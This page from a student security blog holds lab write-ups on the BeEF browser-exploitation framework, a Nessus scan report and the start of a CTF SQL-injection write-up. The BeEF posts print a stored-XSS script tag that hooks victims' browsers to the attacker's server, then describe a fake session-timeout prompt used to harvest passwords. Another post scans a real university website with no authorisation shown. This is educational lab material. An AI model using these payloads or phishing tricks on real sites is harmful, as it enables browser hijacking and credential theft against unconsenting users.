<p><span lang=EN-US><img src="/2020/02/16/beefu/image004.jpg" class=""></span></p>
<span lang=EN-US style='font-size:10.5pt;font-family:等线'>

</span>

<p>只要目标网页访问带有<span lang=EN-US>&lt;script src=”<a href="http://10.0.2.15/hook.js" target="_blank" rel="noopener">http://10.0.2.15/hook.js</a>”&gt;&lt;/script&gt;</span>标签的链接或是页面，此浏览器就会被勾连（<span lang=EN-US>hook</span>）。从而使我们能在<span lang=EN-US>beef</span>的<span lang=EN-US>web UI</span>中看到目标浏览器的信息以及控制权。</p>
<p>此次实验我使其访问<span lang=EN-US>beef</span>的主页<span lang=EN-US>/demos/butcher/index.html</span>，因为其页面自带有<span lang=EN-US>/hook.js</span></p>
<p>先测试此站点是否存在<span lang=EN-US>XSS</span>注入，我们选择<span lang=EN-US>XSS(DOM)</span>页面进行测试。</p>
<p><span lang=EN-US><img src="/2020/02/16/beefu/image005.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/16/beefu/image006.jpg" class=""></span>弹窗显示<span
lang=EN-US>1</span>，则存在<span lang=EN-US>XSS</span>漏洞。</p>
<p>再试试反射型<span lang=EN-US>XSS</span>。</p>
<p><span lang=EN-US><img src="/2020/02/16/beefu/image007.jpg" class=""></span></p>
<p>再测试<span lang=EN-US>DOM</span>型<span lang=EN-US>XSS</span></p>
<p><span lang=EN-US><img src="/2020/02/16/beefu/image008.jpg" class=""></span></p>
<p>测试完毕，发现都可以注入。</p>
<p>于是我们尝试在存在存储型<span lang=EN-US>XSS</span>处注入<span lang=EN-US>&lt;script src=”<a href="http://10.0.2.15:3000/demos/butcher/index.html”&gt;www.baidu.com&lt;/script" target="_blank" rel="noopener">http://10.0.2.15:3000/demos/butcher/index.html”&gt;www.baidu.com&lt;/script</a>&gt;,</span>并将评论框最大长度限制删除。</p>
<p><span lang=EN-US><img src="/2020/02/16/beefu/image009.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/16/beefu/image010.jpg" class=""></span></p>
<p>成功注入<span lang=EN-US>,</span>尝试点击链接，跳转到<span
lang=EN-US>beef</span>主页，但是这样不行，容易让用户起疑心，那我们可以让页面再跳转回之前用户访问的界面或者跳转到用户熟悉的界面。例如我们跳转到<span
lang=EN-US>baidu</span>。</p>
<p>首先查看<span lang=EN-US>beef</span>控制中心。<span
lang=EN-US><img src="/2020/02/16/beefu/image011.jpg" class=""></span></p>
<p>发现有用户上线，此时我们用命令模块使浏览器切入<span
lang=EN-US>baidu</span>页面。</p>
<p><span lang=EN-US><img src="/2020/02/16/beefu/image012.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/16/beefu/image013.jpg" class=""></span></p>
<p>此时用户在此页面的任何操作都会被记录（仅限此页面）。</p>
<p>同时在跳转的时候，我们可以伪装成会话超时，让用户重新输入如用户名和密码。</p>
<p><span lang=EN-US><img src="/2020/02/16/beefu/image014.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/16/beefu/image015.jpg" class=""></span></p>
<p>当用户确定时会回显。成功获取用户密码。</p>
<p><span lang=EN-US><img src="/2020/02/16/beefu/image016.jpg" class=""></span></p>
<p>到这里测试结束。</p>
<p>其实以上过程可以配合<span
lang=EN-US>metasploit</span>来进行，再辅以脚本来配合社工，可以让各种交互之间更好地协调，来达成更好的实际效果。</p>
<p><strong><span lang=EN-US style='color:black'>Beef</span><span
style='color:black'>工作机制</span></strong>：在<span lang=EN-US>beef</span>上有一个叫<span
lang=EN-US>zombie</span>的东西，即受害浏览器。<span lang=EN-US>zombie</span>是被<span
lang=EN-US>hook</span>（勾连）的，如果受害浏览器访问了有勾子（由<span lang=EN-US>js</span>编写）的页面，就会被<span
lang=EN-US>hook</span>，勾连的浏览器会执行初始代码返回一些信息，接着<span lang=EN-US>zombie</span>会每隔一段时间（默认为<span
lang=EN-US>1</span>秒）就会向<span lang=EN-US>BeeF</span>服务器发送一个请求，询问是否有新的代码需要执行。<span
lang=EN-US>BeeF</span>服务器本质上就像一个<span lang=EN-US>Web</span>应用，被分为前端<span
lang=EN-US>UI</span>，和后端。前端会轮询后端是否有新的数据需要更新，同时前端也可以向后端发送指示，<span lang=EN-US>BeeF</span>持有者可以通过浏览器来登录<span
lang=EN-US>BeeF </span>的后台管理<span lang=EN-US>UI</span>。</p>
<p><strong>总结：</strong>经过探索，发现<span lang=EN-US>beef</span>仍有许多许多功能可以实现。只要受害者访问带有<span
lang=EN-US>hook.js</span>的页面，就会被勾连，<span lang=EN-US>beef</span>可以对其进行强化控制或是信息收集（监听），通过快速与<span
lang=EN-US>zombie</span>之间通信交互，实现对<span lang=EN-US>zombie</span>的控制。总的来说<span
lang=EN-US>beef</span>是一个很强大的基于浏览器框架攻击的集成工具。这次实验使我又学习到了不少东西。</p>
<p><span lang=EN-US>&nbsp;</span></p>
<p><span lang=EN-US>&nbsp;</span></p>
</div>

<script src="/live2d-widget/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2d-widget/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":true,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2d-widget/assets/live2d-widget-model-koharu/assets/koharu.model.json"},"display":{"superSample":2,"width":200,"height":400,"position":"right","hOffset":0,"vOffset":-20},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2}});</script><script src="/live2d-widget/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2d-widget/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":true,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2d-widget/assets/live2d-widget-model-koharu/assets/koharu.model.json"},"display":{"superSample":2,"width":200,"height":400,"position":"right","hOffset":0,"vOffset":-20},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2}});</script></body>

</html>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://kkotori.github.io/2020/02/16/beef/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="K_Kotori">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="WS">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/02/16/beef/" class="post-title-link" itemprop="url">Beef基础使用</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2020-02-16 14:34:31 / 修改时间：15:56:35" itemprop="dateCreated datePublished" datetime="2020-02-16T14:34:31+08:00">2020-02-16</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <html>

<head>
<meta http-equiv=Content-Type content="text/html; charset=gb2312">
<meta name=Generator content="Microsoft Word 15 (filtered)">
<style>
<!--
 /* Font Definitions */
 @font-face
        {font-family:宋体;
        panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
        {font-family:"Cambria Math";
        panose-1:2 4 5 3 5 4 6 3 2 4;}
@font-face
        {font-family:等线;
        panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
        {font-family:"\@等线";
        panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
        {font-family:"\@宋体";
        panose-1:2 1 6 0 3 1 1 1 1 1;}
 /* Style Definitions */
 p.MsoNormal, li.MsoNormal, div.MsoNormal
        {margin:0cm;
        margin-bottom:.0001pt;
        text-align:justify;
        text-justify:inter-ideograph;
        font-size:10.5pt;
        font-family:等线;}
pre
        {mso-style-link:"HTML 预设格式 字符";
        margin:0cm;
        margin-bottom:.0001pt;
        font-size:12.0pt;
        font-family:宋体;}
span.HTML
        {mso-style-name:"HTML 预设格式 字符";
        mso-style-link:"HTML 预设格式";
        font-family:宋体;}
span.hljs-comment
        {mso-style-name:hljs-comment;}
.MsoChpDefault
        {font-family:等线;}
 /* Page Definitions */
 @page WordSection1
        {size:595.3pt 841.9pt;
        margin:72.0pt 90.0pt 72.0pt 90.0pt;
        layout-grid:15.6pt;}
div.WordSection1
        {page:WordSection1;}
-->
</style>

</head>

<body lang=ZH-CN style='text-justify-trim:punctuation'>

<div class=WordSection1 style='layout-grid:15.6pt'>

<p>先大致了解下Beef，以后可能会用到。</p>
<p><span lang=EN-US>Beef</span>工作机制：在<span lang=EN-US>beef</span>上有一个叫<span lang=EN-US>zombie</span>的东西，即受害浏览器。<span lang=EN-US>zombie</span>是被<span lang=EN-US>hook</span>（勾连）的，如果受害浏览器访问了有勾子（由<span lang=EN-US>js</span>编写）的页面，就会被<span
lang=EN-US>hook</span>，勾连的浏览器会执行初始代码返回一些信息，接着<span lang=EN-US>zombie</span>会每隔一段时间（默认为<span lang=EN-US>1</span>秒）就会向<span lang=EN-US>BeeF</span>服务器发送一个请求，询问是否有新的代码需要执行。<span lang=EN-US>BeeF</span>服务器本质上就像一个<span lang=EN-US>Web</span>应用，被分为前端<span lang=EN-US>UI</span>，和后端。前端会轮询后端是否有新的数据需要更新，同时前端也可以向后端发送指示，<span lang=EN-US>BeeF</span>持有者可以通过浏览器来登录<span lang=EN-US>BeeF </span>的后台管理<span lang=EN-US>UI</span>。</p>
<p>打开<span lang=EN-US>kali2</span>虚拟机，找到<span lang=EN-US>beef-xss framework</span>。</p>
<p><span lang=EN-US><img src="/2020/02/16/beef/image001.jpg" class=""></span></p>
<p>点击进入提示需要更改密码。</p>
<p>先<span lang=EN-US>cat /etc/beef-xss/config.yaml</span>查看<span lang=EN-US>,</span>之后使用<span lang=EN-US>vim</span>来修改。<span lang=EN-US>Vim <span class=hljs-comment>/etc/beef-xss/config.yaml</span></span><span lang=EN-US><img src="/2020/02/16/beef/image002.jpg" class=""></span>先按下<span lang=EN-US>i</span>键，进入插入模式，修改密码用户名如图，再输入<span lang=EN-US>:wq</span>完成写入保存。再次打开<span lang=EN-US>beef-xss</span>。<span lang=EN-US><img src="/2020/02/16/beef/image003.jpg" class=""></span><span lang=EN-US><img src="/2020/02/16/beef/image004.jpg" class=""></span></p>
<p>输入用户名密码登陆即可。</p>
<p>按照其说明在浏览器输入<span lang=EN-US>URL</span>，查询自己<span lang=EN-US>ip</span>为<span lang=EN-US>10.0.2.15</span></p>
<p>在浏览器输入<span lang=EN-US>10.0.2.15:3000/demos/butcher/index.html</span></p>
<p><span lang=EN-US>Ps</span>：我们可以通过访问<span lang=EN-US>10.0.2.15:3000/hook.js</span>来查看<span lang=EN-US>js</span>脚本。</p>
<p><span lang=EN-US><img src="/2020/02/16/beef/image005.jpg" class=""></span></p>
<p>我们先来尝试一些功能，比如页面篡改</p>
<p><span lang=EN-US><img src="/2020/02/16/beef/image006.jpg" class=""></span></p>
<p>用重定向将<span lang=EN-US>beef</span>默认页面篡改成<span lang=EN-US>baidu.com</span>。执行之后如下图</p>
<p><span lang=EN-US><img src="/2020/02/16/beef/image007.jpg" class=""></span></p>
<p>发现不管访问什么<span lang=EN-US>URL</span>都是<span lang=EN-US>10.0.2.15:3000/demos/butcher/index.html</span></p>
<p><span lang=EN-US><img src="/2020/02/16/beef/image008.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/16/beef/image009.jpg" class=""></span></p>
<p>查看<span lang=EN-US>beef</span>日志，发现连鼠标点击操作的位置都被记录了。</p>
<p><span lang=EN-US><img src="/2020/02/16/beef/image010.jpg" class=""></span></p>
<p>接下来再尝试进行端口扫描，填入目标<span lang=EN-US>ip</span>。</p>
<p><span lang=EN-US><img src="/2020/02/16/beef/image011.jpg" class=""></span></p>
<p>等待过后，看到部分回显。</p>
<p><span lang=EN-US><img src="/2020/02/16/beef/image012.jpg" class=""></span></p>
<p><span lang=EN-US>&nbsp;</span></p>
<p><span lang=EN-US>&nbsp;</span></p>
<p>总结：经过探索，发现<span lang=EN-US>beef</span>仍有许多许多功能可以实现。只要受害者访问带有<span lang=EN-US>hook</span>的页面，就会被勾连，<span lang=EN-US>beef</span>可以对其进行持续化控制，通过快速与<span lang=EN-US>zombie</span>之间通信交互，实现对<span lang=EN-US>zombie</span>的控制。总的来说<span lang=EN-US>beef</span>是一个很强大的基于浏览器框架攻击的集成工具。</p>
</div>

<script src="/live2d-widget/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2d-widget/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":true,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2d-widget/assets/live2d-widget-model-koharu/assets/koharu.model.json"},"display":{"superSample":2,"width":200,"height":400,"position":"right","hOffset":0,"vOffset":-20},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2}});</script><script src="/live2d-widget/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2d-widget/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":true,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2d-widget/assets/live2d-widget-model-koharu/assets/koharu.model.json"},"display":{"superSample":2,"width":200,"height":400,"position":"right","hOffset":0,"vOffset":-20},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2}});</script></body>

</html>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://kkotori.github.io/2020/02/16/nes/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="K_Kotori">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="WS">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/02/16/nes/" class="post-title-link" itemprop="url">Nessus简单使用</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2020-02-16 13:40:36 / 修改时间：14:10:01" itemprop="dateCreated datePublished" datetime="2020-02-16T13:40:36+08:00">2020-02-16</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <html>

<head>
<meta http-equiv=Content-Type content="text/html; charset=gb2312">
<meta name=Generator content="Microsoft Word 15 (filtered)">
<style>
<!--
 /* Font Definitions */
 @font-face
        {font-family:"Cambria Math";
        panose-1:2 4 5 3 5 4 6 3 2 4;}
@font-face
        {font-family:等线;
        panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
        {font-family:"\@等线";
        panose-1:2 1 6 0 3 1 1 1 1 1;}
 /* Style Definitions */
 p.MsoNormal, li.MsoNormal, div.MsoNormal
        {margin:0cm;
        margin-bottom:.0001pt;
        text-align:justify;
        text-justify:inter-ideograph;
        font-size:10.5pt;
        font-family:等线;}
a:link, span.MsoHyperlink
        {color:#0563C1;
        text-decoration:underline;}
.MsoChpDefault
        {font-family:等线;}
 /* Page Definitions */
 @page WordSection1
        {size:595.3pt 841.9pt;
        margin:72.0pt 90.0pt 72.0pt 90.0pt;
        layout-grid:15.6pt;}
div.WordSection1
        {page:WordSection1;}
-->
</style>

</head>

<p>老师说<span lang=EN-US>Nessus</span>扫漏特别强，是企业级的那种，我下个小版本来简单摸索摸索。</p>
<body lang=ZH-CN link="#0563C1" vlink="#954F72" style='text-justify-trim:punctuation'>

<div class=WordSection1 style='layout-grid:15.6pt'>

<p>此次初次使用<span lang=EN-US>Nessus</span>对学校<span lang=EN-US><a href="http://www.cumt.edu.cn" target="_blank" rel="noopener">www.cumt.edu.cn</a></span>进行了扫描。发现了部分信息。</p>
<p><span lang=EN-US>1</span>、经过扫描发现学校的远程操作系统<span lang=EN-US><img src="/2020/02/16/nes/image001.jpg" class=""></span>为<span lang=EN-US>MAC OS 10.4</span></p>
<p>之后还发现了类<span lang=EN-US>unix</span>系统<span lang=EN-US>FreeBSD</span>。</p>
<p><span lang=EN-US><img src="/2020/02/16/nes/image002.jpg" class=""></span></p>
<p>发现了服务器类型为<span lang=EN-US>Apache</span></p>
<p><span lang=EN-US><img src="/2020/02/16/nes/image003.jpg" class=""></span></p>
<p>找到了<span lang=EN-US>CPE</span></p>
<p><span lang=EN-US><img src="/2020/02/16/nes/image004.jpg" class=""></span>报告有<span lang=EN-US>ssh</span>运行于部分端口上</p>
<p><span lang=EN-US><img src="/2020/02/16/nes/image005.jpg" class=""></span>还发现了其版本和支持的认证方式。</p>
<p>最后还发现其返回了页面<span lang=EN-US>html</span>源码和<span lang=EN-US>HTTP</span>报文。</p>
<p>本来想<span lang=EN-US>telnet</span>一下试试看，结果发现没响应，然后再仔细查看报告，发现</p>
<p><span lang=EN-US><img src="/2020/02/16/nes/image006.jpg" class=""></span>确定此方法行不通。本地认证检查插件未运行<span lang=EN-US>……</span>继续看报告。</p>
<p>发现了服务器支持时间戳，然而并没有什么用。</p>
<p>再往下看，发现了追踪路由路径。</p>
<p><span lang=EN-US><img src="/2020/02/16/nes/image007.jpg" class=""></span></p>
<p>这应该是发送请求后经由适配器再中转到目标<span lang=EN-US>ip</span>。</p>
<p>可能我的扫描方式不对，并未发现什么有意思的东西。于是调整参数，增加扫描的范围，并加上了搜索<span
lang=EN-US>web app</span>的选项。结果发现了一个在<span lang=EN-US>nessus</span>中报道为高危的<span
lang=EN-US>SSL</span>问题。</p>
<p><span lang=EN-US><img src="/2020/02/16/nes/image008.jpg" class=""></span>根据描述，大致为<span lang=EN-US>SSL2.0/3.0</span>版本加密方法有缺陷。<span
lang=EN-US>NIST</span>已经确定<span lang=EN-US>ssl 3.0</span>不再适用于安全通信。自<span
lang=EN-US>PCI DSS v3.1</span>中的实施日期起，任何版本的<span lang=EN-US>SSL</span>都将不符合<span
lang=EN-US>PCI SSC</span>对<span lang=EN-US>“</span>强加密<span lang=EN-US>”</span>的定义。远程主机支持使用提供中等强度加密的<span
lang=EN-US>ssl</span>密码。<span lang=EN-US>Nessus</span>将中等强度视为使用密钥长度至少为<span
lang=EN-US>64</span>位且小于<span lang=EN-US>112</span>位的任何加密，或者使用<span lang=EN-US>3DES</span>加密套件的任何加密。如果攻击者位于同一物理网络上，则很容易绕过中等强度加密。为了更安全起见，且为了防止有人通过内网攻击，尽管<span
lang=EN-US>ssl/tls</span>有一种安全的方法来选择协议的最高支持版本，但许多<span lang=EN-US>web</span>浏览器以一种不安全的方式实现此功能，使得攻击者能够降级连接因此，建议完全禁用这些协议。</p>
</div>

<script src="/live2d-widget/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2d-widget/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":true,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2d-widget/assets/live2d-widget-model-koharu/assets/koharu.model.json"},"display":{"superSample":2,"width":200,"height":400,"position":"right","hOffset":0,"vOffset":-20},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2}});</script><script src="/live2d-widget/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2d-widget/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":true,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2d-widget/assets/live2d-widget-model-koharu/assets/koharu.model.json"},"display":{"superSample":2,"width":200,"height":400,"position":"right","hOffset":0,"vOffset":-20},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2}});</script></body>

</html>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://kkotori.github.io/2020/02/04/First/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="K_Kotori">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="WS">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/02/04/First/" class="post-title-link" itemprop="url">网安课程设计</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-02-04 16:26:15" itemprop="dateCreated datePublished" datetime="2020-02-04T16:26:15+08:00">2020-02-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-02-20 18:00:09" itemprop="dateModified" datetime="2020-02-20T18:00:09+08:00">2020-02-20</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>结课的时候老师让我们写写平台上的题目，写题目不累，写wp汇总才累orz。</p>
<html>

<head>
<meta http-equiv=Content-Type content="text/html; charset=gb2312">
<meta name=Generator content="Microsoft Word 15 (filtered)">
<style>
<!--
 /* Font Definitions */
 @font-face
    {font-family:"MS Mincho";
    panose-1:2 2 6 9 4 2 5 8 3 4;}
@font-face
    {font-family:宋体;
    panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
    {font-family:黑体;
    panose-1:2 1 6 9 6 1 1 1 1 1;}
@font-face
    {font-family:"Cambria Math";
    panose-1:2 4 5 3 5 4 6 3 2 4;}
@font-face
    {font-family:等线;
    panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
    {font-family:"等线 Light";
    panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
    {font-family:Consolas;
    panose-1:2 11 6 9 2 2 4 3 2 4;}
@font-face
    {font-family:"\@黑体";
    panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
    {font-family:"\@宋体";
    panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
    {font-family:"\@等线 Light";}
@font-face
    {font-family:"\@等线";
    panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
    {font-family:"\@MS Mincho";
    panose-1:2 2 6 9 4 2 5 8 3 4;}
 /* Style Definitions */
 p.MsoNormal, li.MsoNormal, div.MsoNormal
    {margin:0cm;
    margin-bottom:.0001pt;
    font-size:12.0pt;
    font-family:宋体;}
h1
    {mso-style-link:"标题 1 字符";
    margin-top:17.0pt;
    margin-right:0cm;
    margin-bottom:16.5pt;
    margin-left:0cm;
    text-align:justify;
    text-justify:inter-ideograph;
    line-height:240%;
    page-break-after:avoid;
    font-size:22.0pt;
    font-family:等线;}
h2
    {mso-style-link:"标题 2 字符";
    margin-top:13.0pt;
    margin-right:0cm;
    margin-bottom:13.0pt;
    margin-left:0cm;
    text-align:justify;
    text-justify:inter-ideograph;
    line-height:173%;
    page-break-after:avoid;
    font-size:16.0pt;
    font-family:"等线 Light";}
h3
    {mso-style-link:"标题 3 字符";
    margin-top:13.0pt;
    margin-right:0cm;
    margin-bottom:13.0pt;
    margin-left:0cm;
    text-align:justify;
    text-justify:inter-ideograph;
    line-height:173%;
    page-break-after:avoid;
    font-size:16.0pt;
    font-family:等线;}
p.MsoToc1, li.MsoToc1, div.MsoToc1
    {margin:0cm;
    margin-bottom:.0001pt;
    font-size:16.0pt;
    font-family:黑体;}
p.MsoToc2, li.MsoToc2, div.MsoToc2
    {margin-top:0cm;
    margin-right:0cm;
    margin-bottom:0cm;
    margin-left:24.0pt;
    margin-bottom:.0001pt;
    font-size:16.0pt;
    font-family:"Times New Roman",serif;}
p.MsoToc3, li.MsoToc3, div.MsoToc3
    {margin-top:0cm;
    margin-right:0cm;
    margin-bottom:0cm;
    margin-left:42.0pt;
    margin-bottom:.0001pt;
    font-size:12.0pt;
    font-family:宋体;}
p.MsoHeader, li.MsoHeader, div.MsoHeader
    {mso-style-link:"页眉 字符";
    margin:0cm;
    margin-bottom:.0001pt;
    text-align:center;
    layout-grid-mode:char;
    border:none;
    padding:0cm;
    font-size:9.0pt;
    font-family:宋体;}
p.MsoFooter, li.MsoFooter, div.MsoFooter
    {mso-style-link:"页脚 字符";
    margin:0cm;
    margin-bottom:.0001pt;
    layout-grid-mode:char;
    font-size:9.0pt;
    font-family:宋体;}
p.MsoTitle, li.MsoTitle, div.MsoTitle
    {mso-style-link:"标题 字符";
    margin-top:12.0pt;
    margin-right:0cm;
    margin-bottom:3.0pt;
    margin-left:0cm;
    text-align:center;
    font-size:16.0pt;
    font-family:"等线 Light";
    font-weight:bold;}
a:link, span.MsoHyperlink
    {color:#0563C1;
    text-decoration:underline;}
a:visited, span.MsoHyperlinkFollowed
    {color:#954F72;
    text-decoration:underline;}
code
    {font-family:宋体;}
pre
    {mso-style-link:"HTML 预设格式 字符";
    margin:0cm;
    margin-bottom:.0001pt;
    font-size:12.0pt;
    font-family:宋体;}
p.MsoListParagraph, li.MsoListParagraph, div.MsoListParagraph
    {margin:0cm;
    margin-bottom:.0001pt;
    text-indent:21.0pt;
    font-size:12.0pt;
    font-family:宋体;}
p.MsoTocHeading, li.MsoTocHeading, div.MsoTocHeading
    {margin-top:12.0pt;
    margin-right:0cm;
    margin-bottom:0cm;
    margin-left:0cm;
    margin-bottom:.0001pt;
    line-height:107%;
    page-break-after:avoid;
    font-size:16.0pt;
    font-family:"等线 Light";
    color:#2F5496;}
span.a
    {mso-style-name:"页眉 字符";
    mso-style-link:页眉;}
span.a0
    {mso-style-name:"页脚 字符";
    mso-style-link:页脚;}
span.1
    {mso-style-name:"标题 1 字符";
    mso-style-link:"标题 1";
    font-weight:bold;}
span.2
    {mso-style-name:"标题 2 字符";
    mso-style-link:"标题 2";
    font-family:"等线 Light";
    font-weight:bold;}
span.3
    {mso-style-name:"标题 3 字符";
    mso-style-link:"标题 3";
    font-weight:bold;}
span.HTML
    {mso-style-name:"HTML 预设格式 字符";
    mso-style-link:"HTML 预设格式";
    font-family:宋体;}
span.a1
    {mso-style-name:"标题 字符";
    mso-style-link:标题;
    font-family:"等线 Light";
    font-weight:bold;}
.MsoChpDefault
    {font-family:等线;}
 /* Page Definitions */
 @page WordSection1
    {size:595.3pt 841.9pt;
    margin:72.0pt 90.0pt 72.0pt 90.0pt;
    layout-grid:16.3pt;}
div.WordSection1
    {page:WordSection1;}
 /* List Definitions */
 ol
    {margin-bottom:0cm;}
ul
    {margin-bottom:0cm;}
-->
</style>

</head>

<body lang=ZH-CN link="#0563C1" vlink="#954F72" style='text-justify-trim:punctuation'>

<div class=WordSection1 style='layout-grid:16.3pt'>

<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a><a name="_Toc28387026"><span style='font-size:18.0pt;font-family:黑体'>序言</span></a></h1><p>此次实验报告，我选择了任务二。我事先询问过张老师，可以只写web类的题目，但是由于只写一个网站的可能会比较少，所以需要多做一些。因此在这里选了功放世界和hackme的题目。还有一点，看了任务一中的任务分类，我对<br>其中的部分挺感兴趣，因为DDOS一直都是了解，并未真正下手尝试过，因此也做了部分任务一第六章中的内容。</p>
<h1 id="HACK-ME"><a href="#HACK-ME" class="headerlink" title="HACK ME"></a><a name="_Toc28387027"><span style='font-size:18.0pt;font-family:黑体'>HACK ME</span></a></h1><p><a name="_Toc28387028"><span lang=EN-US style='font-size:
15.0pt;font-family:黑体'>hide and seek</span></a></p>
<p>点击题目进入，按<span lang=EN-US>F12</span>查看页面源代码即可找到。</p>
<img src="/2020/02/04/First/image001.jpg" class="" title="This is an example image">
<p><span lang=EN-US><img src="/First/image001.jpg" alt=""></span></p>
<h2 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a><a name="_Toc28387029"><span lang=EN-US style='font-size:15.0pt;line-height: 173%;font-family:黑体'>guestbook</span></a></h2><p>题目让我们使用<span lang=EN-US>sqlmap,</span>看来就是<span lang=EN-US>sql</span>注入了，但是我们不用<span
lang=EN-US>sqlmap</span>。</p>
<p>但是怎么测试<span lang=EN-US>New Post</span>都没发现有<span lang=EN-US>XSS</span>或是注入点。本来以为是盲注也测试失败。</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image002.jpg" class=""><img src="/2020/02/04/First/image003.jpg" class=""></span></p>
<p>切换到<span lang=EN-US>MessageList</span>的时候，扫了一眼<span
lang=EN-US>url</span>突然发现有个可疑的点。在我查询自己提交的<span lang=EN-US>POST</span>的时候出现了一个类似这样的东西。</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image004.jpg" class=""></span></p>
<p>测试一下</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image005.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/04/First/image006.jpg" class=""></span></p>
<p>发现真正的注入点<span lang=EN-US>……</span></p>
